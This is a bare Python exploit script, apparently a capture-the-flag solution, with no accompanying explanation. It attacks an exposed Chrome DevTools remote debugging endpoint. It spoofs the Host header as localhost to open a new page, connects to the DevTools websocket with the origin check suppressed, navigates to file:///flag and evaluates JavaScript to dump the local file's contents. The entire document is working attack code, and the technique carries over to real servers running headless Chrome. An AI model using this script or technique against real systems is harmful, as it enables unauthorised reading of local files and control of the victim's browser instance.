import requests
import json
import base64
from urllib.parse import quote_plus
from websockets.sync.client import connect
import websocket

host = 'boulevard-of-broken-dreams--kshmr-7952.ctf.kitctf.de'
url = f'https://{host}'

try:
    r = requests.put(f'{url}/json/new?file:///flag', headers=dict(Host='localhost'))
    
    pageId = json.loads(r.text)['id']
    
    print(pageId)

    wsurl = f"wss://{host}/devtools/page/{pageId}"

    ws = websocket.create_connection(wsurl, suppress_origin=True)

    ws.send(json.dumps({
        "id": 6969,
        "method": "Page.navigate",
        "params": {
            "url": "file:///flag"
        }
    }))

    resp = json.loads(ws.recv())
    print(resp)

    ws.send(json.dumps({
        "id": 6970,
        "method": "Runtime.evaluate",
        "params": {
            "expression": "document.documentElement.outerHTML"
        }
    }))

    resp = json.loads(ws.recv())
    print(resp)

    ws.close()
    
except Exception as e:
    print("Error: e", e)